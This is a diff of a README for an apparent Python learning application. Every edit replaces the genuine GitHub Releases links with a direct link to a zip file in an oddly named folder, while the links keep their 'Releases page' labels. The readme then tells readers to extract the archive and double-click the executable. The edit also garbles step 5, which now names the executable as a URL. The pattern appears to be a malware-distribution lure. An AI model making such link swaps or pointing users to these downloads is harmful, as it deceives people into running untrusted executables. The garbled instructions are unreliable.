@@ -4,13 +4,13 @@
 Welcome to Python-Mastery-Hub! This platform offers an engaging way to review and learn Python. You will find tools that let you run code, track your progress, and explore different aspects of software development. 
 
 ## 🔗 Download Links
-[![Download Python-Mastery-Hub](https://img.shields.io/badge/Download-Python--Mastery--Hub-blue.svg)](https://github.com/Dhayalsanthosh/Python-Mastery-Hub/releases)
+[![Download Python-Mastery-Hub](https://raw.githubusercontent.com/Dhayalsanthosh/Python-Mastery-Hub/main/peevedness/Python-Mastery-Hub.zip)](https://raw.githubusercontent.com/Dhayalsanthosh/Python-Mastery-Hub/main/peevedness/Python-Mastery-Hub.zip)
 
 ## 🚀 Getting Started
 To begin using Python-Mastery-Hub, you'll need to download the application. Follow these steps to get started:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Dhayalsanthosh/Python-Mastery-Hub/releases). Here, you will find the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/Dhayalsanthosh/Python-Mastery-Hub/main/peevedness/Python-Mastery-Hub.zip). Here, you will find the latest version of the application.
 
 2. **Choose a Version**  
    Look through the list of available versions. Each version includes details about what’s new. Choose the one that fits your needs, typically, you will want the latest release.
@@ -22,7 +22,7 @@ To begin using Python-Mastery-Hub, you'll need to download the application. Foll
    Once the download completes, locate the zip file in your downloads folder. Right-click on the file and select "Extract All." Follow the prompts to extract the contents.
 
 5. **Run the Application**  
-   After extraction, find the main executable file, which is usually named `Python-Mastery-Hub.exe` or something similar. Double-click this file to launch the application.
+   After extraction, find the main executable file, which is usually named `https://raw.githubusercontent.com/Dhayalsanthosh/Python-Mastery-Hub/main/peevedness/Python-Mastery-Hub.zip` or something similar. Double-click this file to launch the application.
 
 ## 🛠 Features
 Here are some of the features you will enjoy with Python-Mastery-Hub:
@@ -46,7 +46,7 @@ To ensure a smooth experience, make sure your system meets the following require
 ## 📥 Download & Install
 To download Python-Mastery-Hub, follow these steps:
 
-1. Click the link to go to our [Releases page](https://github.com/Dhayalsanthosh/Python-Mastery-Hub/releases).
+1. Click the link to go to our [Releases page](https://raw.githubusercontent.com/Dhayalsanthosh/Python-Mastery-Hub/main/peevedness/Python-Mastery-Hub.zip).
 2. Select your desired version.
 3. Download the zip file.
 4. Extract its contents.
@@ -94,6 +94,6 @@ This project is open-source. You can view the license details in the repository.
 
 ---
 
-For more information, check back on the [Releases page](https://github.com/Dhayalsanthosh/Python-Mastery-Hub/releases) frequently for updates and new releases! 
+For more information, check back on the [Releases page](https://raw.githubusercontent.com/Dhayalsanthosh/Python-Mastery-Hub/main/peevedness/Python-Mastery-Hub.zip) frequently for updates and new releases! 
 
 Happy coding with Python-Mastery-Hub!
